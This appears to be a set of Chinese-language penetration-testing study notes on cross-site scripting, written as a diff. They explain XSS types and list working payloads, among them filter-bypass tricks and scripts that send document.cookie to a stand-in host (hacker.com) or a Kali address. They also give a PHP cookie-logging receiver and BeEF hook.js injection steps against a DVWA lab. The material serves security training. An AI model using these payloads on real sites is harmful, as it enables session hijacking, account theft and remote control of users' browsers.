@@ -1,0 +1,168 @@
+		
+XSS: 跨站脚本攻击
+cross site scripting:XSS
+前面的三个攻击方式利用的服务器端,攻击服务器.,WAF防御,入侵检测,IDS了
+		
+	原理:利用用户提交数据(代码或者数据,区别sql注入),利用转义处理或过滤不足的缺点,添加代码,嵌入到web网页中
+使得别的用户访问都会执行嵌入的代码.   对客户端攻击,挂马.
+	危害: 
+1.盗取各类账号,管理员,用户网银账号
+2.篡改数据
+3.非法转账
+4.网站挂马
+5.强制发邮件
+6.控制肉鸡攻击
+		
+		
+#分类,只是代码,不是文件
+1.反射型 :搜索框 ,提交后不会保存,执行时执行,发个链接,点击中招,引导人去点击链接.
+<script>alert('xss')</script>
+<script>alert(document.cookie)</script>
+
+2.存储型 :留言板 ,直接点页面就会中招.
+<script src='172.16.70.216:3000/hook.js"></script>,
+1.页面挂马,网站存在存储型XSS漏洞
+2.用户访问挂马页面
+3,用户被马访问http://172.16.70.216:3000/hook.js,		使用beef控制user,达到控制用户的目的.
+弹框,重定向,看到用户界面等操作.cookie交了就完了
+
+3.DOM型XSS
+
+
+##XSS原因:过于信任客户端提交.
+
+
+三:XSS脚本构建
+	
+3.1.###HTML标签
+<iframe> ,嵌入页面
+<textarea> 定义多行的文本输入
+<img> 嵌入图片
+<script> 嵌入脚本,script元素可以包含脚本语句,也可通过src属性指向外部脚本文件
+必需的type属性规定脚本的MIME类型
+jS常见,图像操作,表单验证及动态内容更新/.
+
+	
+3.2.##常用JS方法
+alert()			警示框
+window.location		获取当前页面URL并把浏览器定向到新的页面
+location.href		返回当前显示的文档的完整URL,还是重定向
+onload		一张页面或一副图像完成加载
+onsubmit	点击触发
+onerror		加载文档或图像发生错误时触发
+
+
+3.3 脚本构建
+1) 弹窗警告,一旦正确执行 ,意味着后端服务器没有对特殊字符进行过滤.'<>/'
+<script>alert('xss')</script>
+<script>alert(document.cookie)</script>
+
+2) 页面嵌套
+<iframe src=http://www.baidu.com width=300 height=300></iframe>
+<iframe src=http://www.baidu.com width=0 height=0 border=0></iframe>
+
+3) 页面重定向
+<script> window.location="http://www.baidu.com"</script>
+<script>location.href="http://www.baidu.com"</script>
+
+4) 弹窗警告并重定向
+<script>alert("请移步到我们的新站点");location.href="http://www.baidu.com"</script>
+<script>alert('xss');location.href="http://www.baidu.com"</script>
+通过网站内部私信发送给用户,用户点击中招
+
+5) 访问恶意代码,src和location不同,不会发生跳转,更为隐蔽
+<script src="http://www.baidu.com/xss.js"></script>			src和location不同,不会发生跳转,更为隐蔽
+<script src="http://beef_ip:3000/hook.js"></script>  #结合beef手机用户cookie信息
+
+6)	巧用图片标签,比代码更隐蔽
+<img src="#" onerror=alert('xss')>
+<img src="javascript:alert('xss')>
+<img src="http://beef_ip:3000/hook.js"></img>
+
+7) 绕开过滤的脚本
+大小写<ScriPt>alert('xss')</SCRipt>
+字符编码,采用URL,Base64 等编码.<a> 标签代表超链接.
+#建立超链接,点击提示xss.e.g.:
+<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#34;&#120;&#115;&#115;&#34;&#41;">yangge</a>
+
+8) 收集用户cookie
+打开新窗口并采用本地cookie访问目标网页,打开新窗口并采用本地cookie访问目标网页
+<script>window.open("http://www.hacker.com/cookie.php?cookie="+document.cookie)</script>
+<script> document.location="http://www.hacker.com/cookie.php?cookie="+document.cookie</script>
+<script>new Image().src="http://www.hacker.com/cookie.php?cookie="+document.cookie;</script>
+<img src="http://www.hacker.com/cookie.php?cookie='+document.cookie"></img>
+<iframe src="http://www.hacker.com/cookie.php?cookie='+document.cookie"></iframe>
+<script>new Image().src="http://www.hacker.com/cookie.php?cookie='+document.cookie";img.width=0;img.height=0;</script>
+
+
+四:反射型XSS
+
+五:存储型XSS
+存储型不够长度限制时,打开f12,自定义长度限制后再复制一句话木马.
+e.g.:
+评论框
+<script>alert('xss')</script>
+F12 开发者控制台,选择器查看某一块区域的代码.
+攻击过程;
+1. 构建手机cookie的web服务器
+2. 构造XSS代码并植入到web服务器
+3. 等待肉鸡触发XSS代码并将cookie发送到kali
+4. cookie 利用，直接利用cookie转到beef的界面，通过
+
+
+1.构建收集cookie的web服务器
+启动apache2 
+#	systemctl start apache2
+#	systemctl status apache2
+#如果状态报错:	 AH00558: apache2: Could not reliably determine the server's fully qualified domain name
+#编辑apache2的配置文件
+	vim /etc/apache2/apache2.conf 
+	添加 一行 ServerName localhost:80 即可
+或者
+	echo "ServerName localhost:80" >> /etc/apache2/apache2.conf 
+#编辑apache2的文件
+# vim /var/www/html/cookie_rec.php 
+<?php
+	$cookie = $_GET['cookie'];
+	$log = fopen("cookie.txt","a");
+	fwrite($log,$cookie . "\n");
+	fclose($log);
+?>
+#给文件夹赋予所有者权限www-data
+#	chown -R www-data /var/www
+
+2.通过渗透剂植入XSS代码:
+<script>window.open('http://192.168.218.129/cookie_rec.php?cookie='+document.cookie)</script>
+#其中192.168.218.129是kali主机
+#要先清除之前的测试代码,setup选项中的重建数据库.
+3. 用户访问弹窗后即可获得cookie,也可不弹窗使用src方法.
+在kali端发现/var/www/html/cookie.txt文件中存储用户cookie信息
+4.利用cookie.
+#####################
+			
+			
+六:自动化XSS,beef使用.
+		
+6.1 启动apache和beef:
+#	service apache2 start
+重置数据库,setup那里
+kali端点击beef.启动.使用beef提供的hook.js文件
+访问web服务点:http://192.168.218.129:3000/ui/panel
+默认账号密码:beef
+			
+			
+6.2 用户访问:http://192.168.218.129:3000/hook.js
+dvwa里设置存储型xss:
+1) <script src="http://beef_ip:3000/hook.js"></script>
+
+2)<script src="http://192.168.218.129:3000/hook.js"></script>
+
+beef中抓住机器,查看在线的机器的commands
+命令颜色:
+绿色:对目标主机生效不可见
+橙色:对目标主机生效但可能可见
+灰色:对目标主机未必生效
+红色:对目标主机不生效
+
+
+
